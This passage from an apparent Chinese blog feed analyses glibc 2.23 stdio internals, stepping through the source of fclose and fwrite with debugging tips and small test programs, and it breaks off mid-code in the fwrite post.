<p>因为分别查看了定义类型发现Elf32_Word和Elf32_Addr都是unsigned int类型，这个类型是4个字节，而unsigned char是1个字节，而查看了Elf32_Section发现它是被uint16_t定义的，而uint16_t则是unsigned short int类型，为2个字节。因此整个结构体为16字节。</p>
<p><strong>上面两个示例都提供了解决问题的基本思考方式，希望对师傅们有帮助</strong></p>
<h2 id="4、分析一个函数源码首先应该做的是什么？"><a href="#4、分析一个函数源码首先应该做的是什么？" class="headerlink" title="4、分析一个函数源码首先应该做的是什么？"></a>4、分析一个函数源码首先应该做的是什么？</h2><p>我这里提供一个初学者最开始分析源码的一个思路。</p>
<p>以我最初分析fopen函数源码为例，首先肯定是要把vscode打开，确保自己手里有一份源码(而非只看某篇文章出现的源码)，然后先用gdb去调试，这次调试看什么？对于初学者而言，第一次应该是啥都看不懂，那也要硬着头皮把整个函数的汇编指令都si给执行一遍(就最起码对整个函数调用的函数数量，哪些出现频率高的函数起码有个印象)，然后第二次在把整个函数的汇编指令都si给执行一遍，这次去观察并记录期间调用的函数关系(最好是拿图画下来)，看不懂函数关系也没事，但至少要去画一遍或者写一遍。(就如下图这样)</p>
<p><img src="https://s2.loli.net/2022/08/13/LTdExvIBYAWhaeZ.png" alt="image-20220813082114252"></p>
<p>现在我们已经通过自己的调试有了一份“地图”，然后开始对着vscode源码开始从头分析。因为刚开始肯定有很多地方都不懂，那我们所谓的分析就会变的异常困难，<strong>我们可以先试着预测函数的走向以及执行后可能的结果。</strong></p>
<p>举个最简单的例子:</p>
<p>下面的代码就是fopen函数的最开始部分，发现在69行执行了malloc函数，那我们就可以<del>猜测</del>推断__fopen_internal函数就会调用malloc函数，而malloc申请的内存大小应该是locked_FILE结构体的大小，而返回的地址则给了new_f。(如下图)</p>
<img src="https://s2.loli.net/2022/08/13/89enG1XHJkFdirb.png" alt="image-20220813082708464" style="zoom:50%;" />

<p>因为是初学时的源码分析，我们并不能保证百分百是这样的，那我们就用动态调试来看看是不是这样的，发现动态调试到这里，确实执行到了这里。</p>
<p><img src="https://s2.loli.net/2022/08/13/HSQ13JrKZWyxwER.png" alt="image-20220813083404379"></p>
<p>我们执行这行代码后再看下locked_FILE结构体的大小(如下)，因此判断申请的堆块大小最终为0x231(0x220+0x10+0x1)</p>
<p><img src="https://s2.loli.net/2022/08/13/wyGRTcgW2NbDqmu.png" alt="image-20220813083513162"></p>
<p><img src="https://s2.loli.net/2022/08/13/AJKH4MogpXh3GtS.png" alt="image-20220813083643376"></p>
<p>而new_f的值应该是malloc返回的堆块的用户区地址。(如下)</p>
<p><img src="https://s2.loli.net/2022/08/13/iMSIPThdeqc16U2.png" alt="image-20220813083753980"></p>
<p>至此我们就完成了一次最简单的验证。</p>
<p>而之后的流程也大致如此，先看源码分析，如果源码看懂了那就配合动态调试看看是否是自己分析的那样，如果源码没看懂，就直接动态调试看看函数是怎么执行的。对于初学者而言刚开始可能会比较困难，可以去网上找一些师傅已经做过的源码分析来作为参考，这样遇到实在分析不懂的地方，就看看其他师傅是怎么分析的。</p>
<h2 id="5、善于用搜索引擎"><a href="#5、善于用搜索引擎" class="headerlink" title="5、善于用搜索引擎"></a>5、善于用搜索引擎</h2><p>现在许多常见的问题其实很多都可以在师傅们的文章中找到答案，如果遇到自己不会的问题，可以尝试在百度或者google上搜索(如果有条件的话，最好还是用google)。</p>
<h2 id="6、总结函数的调用流程"><a href="#6、总结函数的调用流程" class="headerlink" title="6、总结函数的调用流程"></a>6、总结函数的调用流程</h2><p>为了确保自己是真的熟悉了函数整个的调用流程，建议调试过之后，自己在不看源码的情况下，将函数的调用流程总结一遍。</p>
]]></content>
  </entry>
  <entry>
    <title>IO学习--源码分析fclose函数</title>
    <url>/posts/b5738aac.html</url>
    <content><![CDATA[<p>之前分析的三个函数文章链接:</p>
<p><a href="https://zikh26.github.io/posts/ce09b1a.html">IO学习–源码调试fopen函数</a></p>
<p><a href="https://zikh26.github.io/posts/323816c7.html">IO学习–源码分析fread函数</a></p>
<p><a href="https://zikh26.github.io/posts/7b71046d.html">IO学习–源码分析fwrite函数</a></p>
<p>这篇是IO函数源码分析四部曲中的最后一个fclose函数(并不是以后不分析了，说实话我感觉分析源码去看看我们平常使用的函数到底是怎么实现的，这个过程很有意思，因此以后有机会的话会再调试一些其他函数，花了四天分析了这四个函数，从最开始分析fopen函数源码的时候懵懵逼逼(那篇文章我基本是纯配合着动态调试才搞懂的整体逻辑)，到分析fread函数时对reserve area以及输入和输出缓冲区有了认识，再到基本是对着源码分析的fwrite函数(也是配合着动态调试，不过此时就是静态分析源码为主了)，最后到分析fclose函数源码时感觉的异常顺利和自然。真的是分析每个函数时都有不同的感受。</p>
<span id="more"></span>


<p>emmm，感慨有些多了，下面进入正文。</p>
<h2 id="整体流程："><a href="#整体流程：" class="headerlink" title="整体流程："></a>整体流程：</h2><p>下面是fclose函数的整体流程，其他师傅如果分析的时候，可以参考下图。</p>
<img src="https://s2.loli.net/2022/08/12/QDBqLfxORoUMbH8.png" alt="image-20220812201040809" style="zoom:50%;" />

<h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码:"></a>源代码:</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> value[<span class="number">20</span>];</span><br><span class="line">    <span class="type">char</span> new[<span class="number">30</span>]=<span class="string">&quot;nice-day&quot;</span>;</span><br><span class="line">    FILE* fp=fopen(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;wt+&quot;</span>);</span><br><span class="line">    fwrite(new,<span class="number">1</span>,<span class="number">10</span>,fp);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>本文的源代码以及调试的程序所依赖的libc都为2.23版本的</strong></p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析:"></a>源码分析:</h2><p>先看第一部分，经过一些寻常检查后，去调用了_IO_un_link 函数。在fopen函数中新创建了_IO_FILE结构体，将其链入了_IO_list_all链表，而这个_IO_un_link 函数则是将fopen函数中创建的_IO_FILE结构体脱链（代码如下）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_fclose (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="comment">/* We desperately try to help programs which are using streams in a</span></span><br><span class="line"><span class="comment">     strange way and mix old and new functions.  Detect old streams</span></span><br><span class="line"><span class="comment">     here.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_old_fclose (fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line">	······</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="脱链部分"><a href="#脱链部分" class="headerlink" title="脱链部分"></a>脱链部分</h3><p>下面是_IO_un_link函数的源码，整体也很好分析。就是先去判断我们要脱链的这个_IO_FILE结构体是否为链表的头指针。如果是的话执行<code>_IO_list_all = (struct _IO_FILE_plus *) _IO_list_all-&gt;file._chain</code>来脱链（代码如下）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_un_link (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;file._flags &amp; _IO_LINKED)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> **<span class="title">f</span>;</span></span><br><span class="line">	......</span><br><span class="line">      <span class="keyword">if</span> (_IO_list_all == <span class="literal">NULL</span>)</span><br><span class="line">	;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (fp == _IO_list_all)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_list_all = (<span class="keyword">struct</span> _IO_FILE_plus *) _IO_list_all-&gt;file._chain;</span><br><span class="line">	  ++_IO_list_all_stamp;</span><br><span class="line">	&#125;</span><br><span class="line">	......</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>如果要脱链的结构体不是链表头指针的话，就去遍历整个链表，去找到需要脱链的那个结构体，然后再脱链(代码如下)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">else</span></span><br><span class="line"><span class="keyword">for</span> (f = &amp;_IO_list_all-&gt;file._chain; *f; f = &amp;(*f)-&gt;_chain)</span><br><span class="line">  <span class="keyword">if</span> (*f == (_IO_FILE *) fp)</span><br><span class="line">    &#123;</span><br><span class="line">      *f = fp-&gt;file._chain;</span><br><span class="line">      ++_IO_list_all_stamp;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>



<h3 id="刷新输出缓冲区"><a href="#刷新输出缓冲区" class="headerlink" title="刷新输出缓冲区"></a>刷新输出缓冲区</h3><p>脱链之后，调用了_IO_file_close_it函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_acquire_lock (fp);</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">  status = _IO_file_close_it (fp);</span><br></pre></td></tr></table></figure>



<p>_IO_new_file_close_it函数中显示判断了一下文件是否有写的权限，如果有的话就调用_IO_do_flush函数来刷新输出缓冲区。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_close_it (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> write_status;</span><br><span class="line">  <span class="keyword">if</span> (!_IO_file_is_open (fp))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_NO_WRITES) == <span class="number">0</span></span><br><span class="line">      &amp;&amp; (fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) != <span class="number">0</span>)</span><br><span class="line">    write_status = _IO_do_flush (fp);</span><br><span class="line">	·······</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>_IO_do_flush是宏定义，调用了_IO_do_write函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  _IO_do_write(_f, (_f)-&gt;_IO_write_base,				      \</span></span><br><span class="line"><span class="meta">	       (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)</span></span><br></pre></td></tr></table></figure>

<p>_IO_do_write函数对输出缓冲区的剩余部分（也就是宏定义中的(_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base）进行了判断，如果输出缓冲区为0的话就直接返回，如果输出缓冲区中有数据的话就调用new_do_write函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_do_write _IO_do_write</span></span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">	  || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>new_do_write函数主要做了两件事，第一执行了系统调用write将输出缓冲区中的数据都读到了文件中。第二就是重置了_IO_write_ptr指针(这两个操作就意味着刷新了输出缓冲区)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">	......</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="系统调用close"><a href="#系统调用close" class="headerlink" title="系统调用close"></a>系统调用close</h3><p>而后随着new_do_write函数的返回，程序再次返回到_IO_new_file_close_it中，此时调用了vtable中的_IO_file_close函数(这个函数就不再说了，就是系统调用了一下close)，然后至此的话主要就剩申请的reserve area区域以及申请出来存放_IO_FILE结构体的内存还没有释放。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> close_status = ((fp-&gt;_flags2 &amp; _IO_FLAGS2_NOCLOSE) == <span class="number">0</span></span><br><span class="line">      ? _IO_SYSCLOSE (fp) : <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<h3 id="将reserve-area释放掉"><a href="#将reserve-area释放掉" class="headerlink" title="将reserve area释放掉"></a>将reserve area释放掉</h3><p>最后_IO_new_file_close_it函数还剩下面这部分代码，先删除reserve area然后将read和write相关指针全部置空，最后调用_IO_un_link确保fopen函数申请的_IO_FILE结构体已经从_IO_list_all链表中脱链。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_setb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);<span class="comment">//删除reserve area</span></span><br><span class="line">_IO_setg (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);<span class="comment">//这个宏是将read相关指针全部置空</span></span><br><span class="line">_IO_setp (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>);<span class="comment">//这个宏是将write相关指针全部置空</span></span><br><span class="line"></span><br><span class="line">_IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line">fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;</span><br><span class="line">fp-&gt;_fileno = <span class="number">-1</span>;</span><br><span class="line">fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> close_status ? close_status : write_status;</span><br></pre></td></tr></table></figure>



<p>这个_IO_setb函数代码如下，发现是先将reserve area这片内存给释放掉，然后清空_IO_buf_base和_IO_buf_end两个指针，这也就意味着将reserve area删除掉了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setb (_IO_FILE *f, <span class="type">char</span> *b, <span class="type">char</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="将结构体fp的内存释放掉"><a href="#将结构体fp的内存释放掉" class="headerlink" title="将结构体fp的内存释放掉"></a>将结构体fp的内存释放掉</h3><p>最后返回到_IO_new_fclose函数，先是调用了vtable中的_IO_default_finish函数(这个函数中做的操作，之前已经做过了，其实就相当于啥都没干)，然后最后将结构体fp释放掉。至此fclose函数结束。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> _IO_release_lock (fp);</span><br><span class="line"> _IO_FINISH (fp);</span><br><span class="line">······</span><br><span class="line"> <span class="keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">   &#123;</span><br><span class="line">     fp-&gt;_IO_file_flags = <span class="number">0</span>;</span><br><span class="line">     <span class="built_in">free</span>(fp);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> status;</span><br></pre></td></tr></table></figure>



<h2 id="总结fclose函数调用流程："><a href="#总结fclose函数调用流程：" class="headerlink" title="总结fclose函数调用流程："></a>总结fclose函数调用流程：</h2><p>先将_IO_FILE结构体脱链，然后去看输出缓冲区中是否还有内容，如果有的话就系统调用write将输出缓冲区中的内容写入文件然后刷新输出缓冲区。接着系统调用close关闭文件，最后将申请的reserve area和装有_IO_FILE结构体的堆块给释放掉。</p>
<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://fish-o0o.github.io/2019/12/29/FILE%E7%BB%93%E6%9E%84%E4%BD%93%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/#fclose">FILE结构体及漏洞利用方法 | Hacked By Fish_o0O (fish-o0o.github.io)</a></p>
<p><a href="https://ray-cp.github.io/archivers/IO_FILE_fclose_analysis">IO FILE之fclose详解 « 平凡路上 (ray-cp.github.io)</a></p>
]]></content>
      <categories>
        <category>源码调试&amp;&amp;分析</category>
      </categories>
      <tags>
        <tag>源码调试&amp;&amp;分析</tag>
      </tags>
  </entry>
  <entry>
    <title>IO学习--源码调试fwrite函数</title>
    <url>/posts/7b71046d.html</url>
    <content><![CDATA[<h2 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h2><p>这个fwrite函数中的_IO_write_ptr指针的挪动和fread函数中的_IO_read_ptr指针的挪动是不太一样的。先回顾一下上一篇文章中_IO_read_ptr指针什么时候挪动？当系统调用read的时候从文件中读取多少个字节的数据到输入缓冲区，就将_IO_read_end指针挪动多少个字节  <strong>初始值和_IO_read_base是一样的</strong> ，而此时的_IO_read_ptr指针不动。当执行memcpy函数将数据从输入缓冲区拷贝多少个字节的数据到我们指定的内存地址，就将_IO_read_ptr指针挪动多少个字节。<strong>在_IO_read_base和_IO_read_ptr之间是已经拷贝过的数据，_IO_read_ptr和_IO_read_end之间是输入缓冲区中还未拷贝的数据。</strong></p>
<p>而本次分析的<strong>fwrite函数则是直接将_IO_buf_end的值赋给了_IO_write_end</strong>（read的那个指针可不是这样），而_IO_write_ptr的初始值则和_IO_write_base的值一样。该函数先从指定的内存地址读取一定字节的数据到输出缓冲区，此时的_IO_write_ptr指针挪动(我这里以及上下文提到的挪动指的都是在原本的基础上加)相应的字节。此时的<strong>_IO_write_base指针和_IO_write_ptr指针之间的区域是将要从输出缓冲区写入文件的数据，而_IO_write_ptr指针和_IO_write_end指针之间的区域是输出缓冲区的可用区域(就是还能再往输出缓冲区拷贝多少个字节的内容)<strong>，当执行系统调用write往文件中写入一定的字节的内容后，_IO_write_ptr就会</strong>减去相应的字节</strong>。</p>
<p>上面的内容一定要清楚，不然分析的时候就会陷入误区</p>
<p>前面两篇文章的地址如下：</p>
<p><a href="https://zikh26.github.io/posts/ce09b1a.html">IO学习–源码调试fopen函数</a></p>
<p><a href="https://zikh26.github.io/posts/323816c7.html">IO学习–源码分析fread函数</a></p>
<span id="more"></span>

<h2 id="整体流程："><a href="#整体流程：" class="headerlink" title="整体流程："></a>整体流程：</h2><p><img src="/../img/image-20221007220914882.png" alt="image-20221007220914882"></p>
<img src="https://s2.loli.net/2022/08/12/iUOa84sphV1Wmyw.png" alt="image-20220811201511246" style="zoom:50%;" />

<p>上面第一张图片是fwrite函数的整体流程，第二张图片是根据我下面写的这个源代码对应的函数调用流程(调试的时候结合这两个图片，可以对自己调试到哪部分有个比较清楚的认知)。</p>
<h2 id="源代码："><a href="#源代码：" class="headerlink" title="源代码："></a>源代码：</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> value[<span class="number">20</span>];</span><br><span class="line">    <span class="type">char</span> new[<span class="number">30</span>]=<span class="string">&quot;nice-day&quot;</span>;</span><br><span class="line">    FILE* fp=fopen(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;wt&quot;</span>);</span><br><span class="line">    fwrite(new,<span class="number">1</span>,<span class="number">25</span>,fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>本文的源代码以及调试的程序所依赖的libc都为2.23版本的</strong></p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>_IO_fwrite 源代码(fwrite原型为_IO_fwrite函数)如下，这段很好分析，先是判断了request（也就是我们要输入的字节数是否为0），然后加锁去执行_IO_sputn函数(该函数是vtable中的_IO_new_file_xsputn函数)。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_fwrite (<span class="type">const</span> <span class="type">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t request = size * count;</span><br><span class="line">  _IO_size_t written = <span class="number">0</span>;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (request == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">    written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (written == request || written == EOF)</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> written / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>然后进入了_IO_new_file_xsputn函数，先是有个if判断如下，这里我很迷惑，因为我不清楚_flags对应的各个位都是什么含义，尽管<strong>通过调试可以看出来这个if并没有进去</strong>，但实际上我并不知道为什么这个if进不去，我上网找了很多资料也没有找到相关_flags各个位的含义，那就继续往下分析吧。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">   &#123;</span><br><span class="line">     count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">     <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  count = p - s + <span class="number">1</span>;</span><br><span class="line">	  must_flush = <span class="number">1</span>;</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>



<p>如果没有进入上面的if，则会去判断是否还存在剩余的输出缓冲区（如下），count是剩余输出缓冲区的大小，to_do是需要往文件中写入的字节数。</p>
<p>根据下面这段代码分析，现在有三种情况分别是count&gt;to_do    count&lt;to_do    count&#x3D;&#x3D;0</p>
<p>第一种是剩余的输出缓冲区比我们要输入的数据大，那memcpy执行后将数据拷贝到输出缓冲区就完事大吉，因为if (to_do + must_flush &gt; 0)这行代码是进不去的，所以就直接return了。第二种是剩余的输出缓冲区比我们要输入的数据小，也进行memcpy函数的拷贝，只不过拷贝后，因为还有数据没有拷贝进输出缓冲区(此时输出缓冲区已经满了)，那就去执行_IO_new_file_overflow函数，它有俩作用，如果不存在输出缓冲区则会进行创建reserve area，如果存在的话，则会调用_IO_do_write函数进行刷新，等刷新后再去拷贝剩下的数据到输出缓冲区。然后还有第三种情况就是此时并没有输出缓冲区。那也去执行_IO_new_file_overflow函数进行创建reserve area，再去拷贝数据到输出缓冲区。</p>
<p>第一种情况下面的代码写的很清楚了，就不再分析第一种情况。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">	count = to_do;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>第二种和第三种情况都会进入这个if中（这个if的代码我没放全，等分析到下面再放之后的部分），进入这个函数后就去调用了_IO_OVERFLOW (f, EOF)，这个函数是vtable中的_IO_new_file_overflow。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     _IO_size_t block_size, do_write;</span><br><span class="line">     <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">     <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line"><span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">   caller that everything has been written.  */</span></span><br><span class="line"><span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br></pre></td></tr></table></figure>



<p>进入_IO_new_file_overflow函数(代码如下)，可以发现有一个对f-&gt;_IO_write_base是否为空的判断，而程序通过这个判断来判定是否没有分配resever area。如果没有分配的话则去执行_IO_doallocbuf函数来分配resever area(这个函数在<a href="https://www.cnblogs.com/ZIKH26/articles/16575066.html">fread源码分析</a>中已经分析过了，这里就不再分析了)，_IO_setg这个宏的作用就是将三个read指针全部赋值为f-&gt;_IO_buf_base(f-&gt;_IO_buf_base在_IO_doallocbuf函数中已经被初始化过了)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);</span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, 